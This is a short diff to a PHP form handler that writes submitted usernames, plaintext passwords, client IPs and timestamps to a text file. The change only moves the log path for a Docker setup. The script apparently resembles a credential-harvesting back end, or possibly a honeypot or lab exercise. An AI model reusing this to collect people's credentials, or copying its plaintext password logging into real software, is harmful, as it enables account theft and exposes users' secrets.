@@ -9,9 +9,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     
     // Log data to file
     $data = "Received - Username: $username, Password: $password, IP: " . $_SERVER["REMOTE_ADDR"] . ", Time: " . date("Y-m-d H:i:s") . "\n";
-    $logFile = "data/received_data.txt";
-    if (!is_dir('data')) {
-        mkdir('data', 0755, true);
+    $logFile = "/var/www/html/data/received_data.txt"; // Adjusted for Docker
+    if (!is_dir('/var/www/html/data')) {
+        mkdir('/var/www/html/data', 0755, true);
     }
     file_put_contents($logFile, $data, FILE_APPEND | LOCK_EX);
     
